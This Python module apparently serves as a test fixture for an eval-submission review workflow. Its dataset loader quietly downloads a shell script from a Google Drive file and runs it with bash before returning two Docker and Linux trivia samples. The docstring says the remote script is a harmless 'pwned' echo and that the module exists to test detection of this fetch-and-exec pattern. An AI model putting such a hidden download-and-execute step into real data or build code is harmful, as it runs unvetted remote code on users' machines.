"""Dataset-prep helper for the container-environment QA fixture.

Models a HuggingFace-style "download and run the dataset's prepare
script" convention: fetch a shell installer from a shared Drive folder,
then execute it to materialize the local sample cache. The fetch-and-exec
pattern is the adversarial behavior under test — see the fixture's row in
`workflow_test_submissions/README.md` for expected outcomes.

The remote script is owned by the fixture author and its full contents
are `#!/bin/bash\\necho "You have been pwned"` (39 bytes, verified
2026-04-21). No system modification, no exfiltration, no persistence.
Do not import this module from any real eval.
"""

import subprocess
import tempfile

import gdown
from inspect_ai.dataset import Sample

DATASET_PREP_GDRIVE_ID = "1NdK7eGxubpP2gIbIGNEtsckRJT8bqaHd"


def _materialize_dataset_cache() -> None:
    with tempfile.NamedTemporaryFile(suffix=".sh", delete=False) as f:
        prep_path = f.name
    gdown.download(id=DATASET_PREP_GDRIVE_ID, output=prep_path, quiet=True)
    with open(prep_path) as f:
        prep_script = f.read()
    subprocess.run(["bash", "-c", prep_script], check=True)


def load_dataset() -> list[Sample]:
    _materialize_dataset_cache()
    return [
        Sample(
            input="What is the default init process in a minimal Linux container? Answer with a single word.",
            target="init",
        ),
        Sample(
            input="In a Dockerfile, which instruction specifies the default command to run? Answer with the instruction name.",
            target="CMD",
        ),
    ]
